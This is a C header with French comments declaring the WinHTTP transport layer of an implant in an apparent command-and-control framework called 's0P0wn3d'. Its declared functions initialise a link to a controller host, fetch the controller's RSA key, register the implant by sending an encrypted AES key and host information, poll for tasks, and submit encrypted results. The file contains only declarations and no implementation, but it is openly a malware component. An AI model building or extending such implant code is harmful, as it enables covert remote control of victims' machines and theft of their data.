/*
 * s0P0wn3d — Couche transport de l'implant (WinHTTP).
 *
 * Gère les communications HTTP avec le contrôleur via l'API WinHTTP.
 */

#ifndef S0P_IMPLANT_TRANSPORT_H
#define S0P_IMPLANT_TRANSPORT_H

#include "../shared/protocol.h"
#include <stdint.h>

/* Initialise la couche transport avec l'URL du contrôleur. */
int transport_init(const char *controller_host, int controller_port);

/* Récupère la clé publique RSA du contrôleur (string PEM malloc-é). */
char *transport_get_pubkey(void);

/* Enregistre l'implant : envoie la clé AES chiffrée + host_info.
 * Retourne le session_id (string malloc-é) ou NULL. */
char *transport_register(const char *encrypted_key_b64,
                          const host_info_t *host);

/* Récupère les tâches en attente (réponse JSON brute malloc-ée). */
char *transport_fetch_tasks(const char *session_id);

/* Soumet un résultat chiffré. Retourne 0 en cas de succès. */
int transport_submit_result(const char *session_id,
                             const char *nonce_b64,
                             const char *payload_b64,
                             const char *tag_b64);

/* Ferme la session WinHTTP. */
void transport_cleanup(void);

#endif /* S0P_IMPLANT_TRANSPORT_H */
